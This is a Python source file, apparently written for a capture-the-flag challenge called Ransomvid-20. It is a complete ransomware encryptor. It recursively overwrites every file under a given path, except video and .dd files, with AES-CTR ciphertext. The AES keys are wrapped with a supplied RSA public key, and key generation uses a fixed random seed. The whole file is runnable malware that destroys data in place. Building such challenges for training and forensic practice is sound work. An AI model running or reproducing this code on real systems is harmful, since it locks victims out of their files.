"""
CTF - Ransomvid-20
"""
__author__ = 'Aleš Padrta @ CESNET.CZ'
__version__ = '1.0'
import argparse, random
from os import walk
import pyaes, rsa

def get_args():
    """
        Cmd line argument parsing (preprocessing)
        """
    parser = argparse.ArgumentParser(description='Ransomvid-20 (!!!I can really hurt, if you run me!!!)')
    parser.add_argument('-p',
      '--path',
      type=str,
      help='Path to encrypt',
      required=True)
    parser.add_argument('-k',
      '--keyfile',
      type=str,
      help='The RSA public key',
      required=True)
    args = parser.parse_args()
    return (
     args.path, args.keyfile)


def get_filenames(path):
    """
        Get list of files to encrypt in given path
        """
    filenames = []
    for root, directories, files in walk(path):
        for name in files:
            if name.split('.')[(-1)] not in ('mpeg', 'avi', 'mp4', 'dd'):
                filenames.append('{}/{}'.format(root, name).replace('\\', '/'))

    filenames.sort()
    return filenames


def init_random(myseed):
    """
        Initialize randomization by defining seed
        """
    random.seed(myseed)


def get_random_aes_key(length):
    """
        Generate random AES key
        """
    key = bytearray(random.getrandbits(8) for _ in range(length))
    return key


def aes_encrypt(data, aeskey):
    """
        Encrypt/decrypt data by provided AES key
        """
    aes = pyaes.AESModeOfOperationCTR(aeskey)
    encdata = aes.encrypt(data)
    return encdata


def read_rsakey(filename):
    """
        Read RSA encryption key from file
        """
    with open(filename, mode='rb') as (public_file):
        key_data = public_file.read()
    public_key = rsa.PublicKey.load_pkcs1_openssl_pem(key_data)
    return public_key


def rsa_encrypt(data, key):
    """
        Encrypt data by provided RSA key (public part)
        """
    encdata = rsa.encrypt(data, key)
    return encdata


def read_file(filename):
    """
        Read content of file to variable
        """
    with open(filename, 'rb') as (fileh):
        data = fileh.read()
    return data


def write_file(filename, key, data, orig_len):
    """
        Write header + encrypted content to file
        """
    with open(filename, 'wb') as (fileh):
        fileh.write(b'RV20')
        fileh.write(key)
        fileh.write(orig_len.to_bytes(8, byteorder='big'))
        fileh.write(data)


def main():
    """
        Main ransom function
        """
    path, rsakeyfile = get_args()
    filenames = get_filenames(path)
    print('Found {} files'.format(len(filenames)))
    if filenames:
        for filename in filenames:
            print('  {}'.format(filename))

    rsakey = read_rsakey(rsakeyfile)
    init_random(2020)
    for filename in filenames:
        aeskey = get_random_aes_key(32)
        data = read_file(filename)
        enc_data = aes_encrypt(data, aeskey)
        enc_aeskey = rsa_encrypt(aeskey, rsakey)
        write_file('{}'.format(filename), enc_aeskey, enc_data, len(data))


main()